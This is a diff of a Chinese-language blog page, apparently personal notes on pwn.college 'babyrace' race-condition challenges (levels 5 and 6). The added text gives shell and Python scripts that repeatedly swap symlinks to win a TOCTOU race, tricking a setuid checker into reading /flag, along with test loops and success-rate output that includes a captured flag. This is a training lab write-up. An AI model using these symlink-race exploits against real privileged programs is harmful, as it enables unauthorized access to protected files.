@@ -36,12 +36,14 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220508231821229.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220505165437735.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220511235547367.png">
+<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220516162810899.png">
+<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220516163018313.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220515153055539.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220515153138069.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220515155725438.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220512222315120.png">
 <meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-15T16:13:56.103Z">
+<meta property="article:modified_time" content="2022-05-16T17:09:59.101Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
@@ -227,7 +229,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      73k 字
+      76k 字
     </span>
   
 
@@ -236,7 +238,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      908 分钟
+      950 分钟
     </span>
   
 
@@ -277,7 +279,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年5月16日 凌晨
+                  不可视境界线最后变动于：2022年5月17日 凌晨
                 
               </p>
             
@@ -1667,7 +1669,7 @@
 <p><a target="_blank" rel="noopener" href="https://sourceware.org/glibc/wiki/MallocInternals">malloc internals</a> </p>
 <p><a target="_blank" rel="noopener" href="https://seclists.org/bugtraq/2005/Oct/118">the rise of houses</a> </p>
 <p>跳过….</p>
-<h1 id="module-C-race"><a href="#module-C-race" class="headerlink" title="module C-race"></a>module C-race</h1><ul>
+<h1 id="module-C-race"><a href="#module-C-race" class="headerlink" title="module C-race"></a>module C-race</h1><h4 id="key-points"><a href="#key-points" class="headerlink" title="key points"></a>key points</h4><ul>
 <li>在一个程序打开文件并写入然后再到执行它的期间进程可能被调度, 这个时候如果文件被改写那么就会出现竞态条件.</li>
 <li>如果这个窗口太短那么竞态条件出现的几率就会更小</li>
 <li>有一个系统调用<strong>nice</strong>, 对应于nice命令, 还有一个ionice, 就是字面意思上的run a program with modified scheduling priority</li>
@@ -1712,6 +1714,16 @@
 <blockquote>
 <p>YouTube-50是babyrace的视频. level5做不下去了准备看看.</p>
 </blockquote>
+<p><strong>补充:</strong> </p>
+<ul>
+<li><p>level5 shell script问题出在rm mv都有一个启动时间和一堆系统调用, 再加上shell是靠fork+exec来执行进程的, 所以就会比较慢, 可能会出现左图中的情况, 就算把几个命令分开进多个循环也还是太慢. 如果写进c, 那就是右图中的理想状态了:<br><img src="../../image/pwn-modules/image-20220516162810899.png" srcset="/img/loading.gif" lazyload alt="image-20220516162810899" style="zoom:80%;" /><img src="../../image/pwn-modules/image-20220516163018313.png" srcset="/img/loading.gif" lazyload alt="image-20220516162810899" style="zoom:80%;" /> </p>
+</li>
+<li><p>使用python的话启动比较慢是事实, 但是进入执行之后到系统调用层面是和c差不多的, 所以只要在python里面进行loop就能达到一样的效果. 想起来前几天看的dirty cow使用的race condition的poc就是用c写的.</p>
+<ul>
+<li>python的话要大量使用到os module来调用系统. 可得好好看看.(练了练shell也不亏就是了)</li>
+</ul>
+</li>
+</ul>
 <h4 id="prepare"><a href="#prepare" class="headerlink" title="prepare"></a>prepare</h4><p>先整个创建超级长的路径的脚本. 顺便学了学shell编程.</p>
 <p>难怪视频里只见到t_end, 因为这样路径上每个文件夹其实都是符号链接, 所以最多20个.</p>
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>prefix=&#x27;a&#x27;<br>ln -s $(pwd) ./root<br>for i in &#123;97..116&#125;	#或者直接用&#123;a..t&#125;<br>do<br>    prefix=$(printf &quot;\\x$(printf %x $i)&quot;)<br>    pushd .<br>    mkdir $prefix<br>    cd $prefix<br>    for j in &#123;1..25&#125;<br>    do<br>        mkdir ./$j<br>        cd ./$j<br>    done<br>    innerwd=$(pwd)<br>    popd<br>    cp -a ./root $innerwd<br>    ln -s $innerwd $(pwd)/$&#123;prefix&#125;_end<br>done<br></code></pre></div></td></tr></table></figure>
@@ -1748,6 +1760,7 @@
 <p>会随着sleep的时间波动, 还是0.0005最高. 在0.005的时候出现path_2的成功率最高. 全都是迷之行为, 至于nice就不试了….</p>
 <h4 id="level2-2"><a href="#level2-2" class="headerlink" title="level2"></a>level2</h4><p>完全一样</p>
 <h4 id="level3-3"><a href="#level3-3" class="headerlink" title="level3"></a>level3</h4><p>在前两题的基础之上检查大小不能超过256字节, 而且在buf[256]之后有一个控制进入win()的v7, 改改文件名很容易绕过</p>
+<p>看了office hours, 用了python的os模块, 尝试了os.fork+分开unlink和symlink+strace程序的系统调用时间并分析窗口(这个窗口比较小). 没试出来什么更好的结果. </p>
 <h4 id="level4-4"><a href="#level4-4" class="headerlink" title="level4"></a>level4</h4><p>利用上面的方法更改打开文件进行栈溢出然后改跳转地址跳转到win().</p>
 <p>什么保护都没开, 固定地址加载.</p>
 <h4 id="level5-5"><a href="#level5-5" class="headerlink" title="level5"></a>level5</h4><blockquote>
@@ -1767,6 +1780,14 @@
 <li>然后ln两个/home/hacker/aa -&gt; /home, 不用管bb其实根本不在/home中.</li>
 <li>最后再ln一个/home/hacker/aa/bb -&gt; /flag</li>
 </ul>
+<p>也许有更好的办法, :</p>
+<ul>
+<li>最开始创建<code>./1/aa/bb(plain file)</code>, <code>./2/aa -&gt; /home</code>, <code>./3/aa/bb -&gt; /flag</code></li>
+<li>然后创建一个symlink叫做dir.</li>
+<li>首先指向<code>./1</code>, 然后指向<code>./2</code>, 最后指向<code>./3</code>.</li>
+<li>这样只要每次unlink dir然后再symlink相应数字文件夹名就行了.<br>完整路径名为<code>/home/hacker/dir/aa/bb</code> </li>
+<li>由于这样子实在太快导致窗口时间都跟不上了. 添加sleep, 大概是0.0001s</li>
+</ul>
 <h5 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h5><p>写了一个脚本避免重复输入一些命令, 不过想清楚之后倒是一遍过了.</p>
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>if [ $1 == &#x27;init&#x27; ]<br>then<br>    cd<br>    mkdir a<br>    cd a<br>    touch b<br>elif [ $1 == 2 ]<br>then<br>    cd<br>    mv a b<br>    ln -s /home /home/hacker/a<br>elif [ $1 == 3 ]<br>then<br>    cd<br>    rm a ./b/b<br>    mv b a<br>    ln -s /flag /home/hacker/a/b<br>elif [ $1 == &#x27;cls&#x27; ]<br>then<br>    rm -r a b 2&gt;/dev/null<br>else<br>    echo &#x27;invalid argument&#x27;<br>fi<br></code></pre></div></td></tr></table></figure>
 
@@ -1777,11 +1798,24 @@
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">持续执行challenge的shell</span><br><br>while [[ 1 ]]<br>do<br>    res=$(/challenge/babyrace_level5.1 /home/hacker/aa/bb | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        printf &quot;\n$res\n\n&quot;<br>        exit<br>    fi<br>done<br></code></pre></div></td></tr></table></figure>
 
 <p>过不了啊啊啊…</p>
-<h5 id="python大法"><a href="#python大法" class="headerlink" title="python大法"></a>python大法</h5><p>看视频尝试python写法:</p>
-<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs"><br></code></pre></div></td></tr></table></figure>
+<h5 id="python大法-key补充"><a href="#python大法-key补充" class="headerlink" title="python大法+key补充"></a>python大法+key补充</h5><ul>
+<li>unlink: delete a name from filesystem. 真是个集合了一堆功能的系统调用, 能删 文件 symlink socket FIFO device.</li>
+<li>一些常数是用os.CONSTANT来调用的.</li>
+<li>如果使用python的builtin function <code>open</code>的话, 会调用fstat ioctl这种没有什么必要的函数. 可以使用os.open来调用低级的函数.</li>
+</ul>
+<p>看视频尝试python写法:</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,sys,time<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> symlink, unlink<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;rm&#x27;</span>:<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;init&#x27;</span> :<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;./initpy&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    time.sleep(<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-comment">#now dir -&gt; 1, need to be unlinked</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./2&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br><br>    <span class="hljs-comment">#now change dir to 3</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./3&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.00003</span>)<br>    <br>    <span class="hljs-comment">#now restore context</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./1&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br></code></pre></div></td></tr></table></figure>
 
+<p>initpy:</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>mkdir -p ./1/aa<br>touch ./1/aa/bb<br><br>mkdir -p ./2<br>ln -s /home ./2/aa #这里还出错过.<br><br>mkdir -p ./3/aa<br>ln -s /flag ./3/aa/bb<br><br>ln -s /home/hacker/1 ./dir<br></code></pre></div></td></tr></table></figure>
 
+<p>测试:</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">(for i in &#123;1..1000&#125;;do /challenge/babyrace_level5.1 ./dir/aa/bb;done) | egrep &#x27;Error|pwn&#x27; | sort | uniq -c<br></code></pre></div></td></tr></table></figure>
 
+<p>结果:</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">    356 Error: directory not owned by root!<br>     44 Error: failed to get directory status!<br>    116 Error: failed to get file status!<br>    472 Error: file is a symlink!<br>      3 pwn.college&#123;ojL-wiqjv9XYN-GR2XsuQ-yucpZ.QXwEDNsMTM1IzW&#125;<br>or<br>	5218 Error: directory not owned by root!<br>    896 Error: failed to get directory status!<br>   1300 Error: failed to get file status!<br>   2422 Error: file is a symlink!<br>     19 pwn.college&#123;ojL-wiqjv9XYN-GR2XsuQ-yucpZ.QXwEDNsMTM1IzW&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>成功率最多就是20/10000, 2‰…….看视频去了, 不知道有没更好的. 太玄学了, 而且这是只是在一个4 core docker里面, 现实机器那不得更多进程+更多cpu内核+奇怪调度算法, 那是我能研究的?直接下一题, cow也是直接上大数量循环. </p>
 <h4 id="level6-5"><a href="#level6-5" class="headerlink" title="level6"></a>level6</h4><p>和上一题相同, 不过dirname之后使用的是lstat, 不follow symlink……</p>
 <p>???????????????????????????????</p>
 <ul>
@@ -1789,9 +1823,25 @@
 <li>然后ln两个/home/hacker/a -&gt; /, 那么原path的dirname就是指: /home/hacker/a/home</li>
 <li>最后再ln一个/home/hacker/a/home/b -&gt; /flag</li>
 </ul>
+<p>改版:</p>
+<ul>
+<li>首先touch一个/home/hacker/1/a/home/b文件, 通过name和symlink验证, </li>
+<li>然后ln两个/home/hacker/2/a -&gt; /, 那么原path的dirname就是指: /home/hacker/dir(2)/a/home</li>
+<li>最后再ln一个/home/hacker/3(dir)/a/home/b -&gt; /flag</li>
+</ul>
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>if [ $1 == &#x27;init&#x27; ]<br>then<br>    cd<br>    mkdir -p a/home<br>    touch a/home/b<br>elif [ $1 == 2 ]<br>then<br>    cd<br>    mv a b<br>    ln -s / /home/hacker/a<br>elif [ $1 == 3 ]<br>then<br>    cd<br>    rm a ./b/home/b<br>    mv b a<br>    ln -s /flag /home/hacker/a/home/b<br>elif [ $1 == &#x27;cls&#x27; ]<br>then<br>    rm -r a b 2&gt;/dev/null<br>else<br>    echo &#x27;invalid argument&#x27;<br>fi<br></code></pre></div></td></tr></table></figure>
 
-<section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>这里要指向2处的地址, 也就是bss+0x10
+<h5 id="python"><a href="#python" class="headerlink" title="python:"></a>python:</h5><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,sys,time<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> symlink, unlink<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;rm&#x27;</span>:<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;init&#x27;</span> :<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;./initpy&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    time.sleep(<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-comment">#now dir -&gt; 1, need to be unlinked</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./2&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br><br>    <span class="hljs-comment">#now change dir to 3</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./3&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.00003</span>)<br>    <br>    <span class="hljs-comment">#now restore context</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./1&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br></code></pre></div></td></tr></table></figure>
+
+<p>initpy:</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>mkdir -p ./1/a/home<br>touch ./1/a/home/b<br><br>mkdir -p ./2<br>ln -s / ./2/a<br><br>mkdir -p ./3/a/home<br>ln -s /flag ./3/a/home/b<br><br>ln -s /home/hacker/1 ./dir<br></code></pre></div></td></tr></table></figure>
+
+<p><code>./dir/a/home/b</code> </p>
+<p>测试:</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">(for i in &#123;1..20000&#125;;do /challenge/babyrace_level6.1 ./dir/a/home/b;done) \<br>| egrep &#x27;Error|pwn&#x27; | sort | uniq -c<br></code></pre></div></td></tr></table></figure>
+
+<p>成功率降到了20/20000, 变成千分之一了……..</p>
+<h4 id="level7-4"><a href="#level7-4" class="headerlink" title="level7"></a>level7</h4><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>这里要指向2处的地址, 也就是bss+0x10
 <a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>这里开始就是从改变后的rsp弹出返回地址. 开始准备通过puts来leak处libc地址.
 <a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span>这之后要接收puts的地址.
 <a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>
